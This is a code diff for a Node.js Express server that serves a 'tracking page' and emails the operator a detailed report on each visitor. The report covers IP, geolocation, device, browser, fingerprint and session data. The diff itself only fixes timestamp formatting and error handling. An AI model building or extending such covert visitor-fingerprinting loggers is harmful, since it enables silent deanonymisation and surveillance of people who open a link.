@@ -37,16 +37,28 @@ app.use((req, res, next) => {
   next();
 });
 
-// Helper functions
+// Fixed timestamp formatting
 function formatTimestamp() {
   const now = new Date();
-  const utc = new Date(now.getTime() + now.getTimezoneOffset() * 60000);
   
+  // Get timezone offset in hours
+  const timezoneOffset = -now.getTimezoneOffset() / 60;
+  const timezoneOffsetString = timezoneOffset >= 0 
+    ? `UTC+${timezoneOffset}` 
+    : `UTC${timezoneOffset}`;
+  
+  // Format local time string with timezone
+  const localTimeString = now.toLocaleString('en-US', {
+    timeZoneName: 'short',
+    hour12: false
+  });
+
   return {
     iso: now.toISOString(),
-    utc: utc.toUTCString(),
-    local: now.toString(),
+    utc: now.toUTCString(),
+    local: localTimeString,
     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    timezoneOffset: timezoneOffsetString,
     unix: Math.floor(now.getTime() / 1000),
     precise: Number(process.hrtime.bigint() / 1000000n)
   };
@@ -182,8 +194,14 @@ app.get('/', async (req, res) => {
       console.error('Email failed:', error);
     });
 
-    // Serve the tracking page
-    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+    // Serve the tracking page - ensure this is the last thing in the route
+    res.sendFile(path.join(__dirname, 'public', 'index.html'), (err) => {
+      if (err) {
+        console.error('Error sending file:', err);
+        res.status(500).send('Error loading page');
+      }
+    });
+
   } catch (error) {
     console.error('Error processing request:', error);
     res.status(500).send('Internal Server Error');
@@ -194,12 +212,12 @@ app.get('/track', (req, res) => {
   res.status(204).end();
 });
 
-// Email content generators (separated for readability)
+// Email content generators
 function generateEmailText(timestamp, geoData, ip, timezone, deviceType, device, screenResolution, colorInfo, os, browser, engine, cpu, isBot, fingerprintData, connectionType, dnt, cookiesEnabled, languagePrefs, referrer, sessionDuration, pageViews, sessionData, userAgent) {
   return `
 === 🌍 TIMING & LOCATION ===
 🕒 UTC Time:     ${timestamp.utc}
-🕒 Local Time:   ${timestamp.local}
+🕒 Local Time:   ${timestamp.local} (${timestamp.timezoneOffset})
 🕒 ISO-8601:     ${timestamp.iso}
 🕒 Unix Time:    ${timestamp.unix}
 🕒 Precise:      ${timestamp.precise} ms
@@ -254,7 +272,7 @@ function generateEmailHtml(timestamp, geoData, ip, timezone, deviceType, device,
   return `
 <b>=== 🌍 TIMING & LOCATION ===</b>
 🕒 <b>UTC Time:</b>     ${timestamp.utc}
-🕒 <b>Local Time:</b>   ${timestamp.local}
+🕒 <b>Local Time:</b>   ${timestamp.local} (${timestamp.timezoneOffset})
 🕒 <b>ISO-8601:</b>     ${timestamp.iso}
 🕒 <b>Unix Time:</b>    ${timestamp.unix}
 🕒 <b>Precise:</b>      ${timestamp.precise} ms
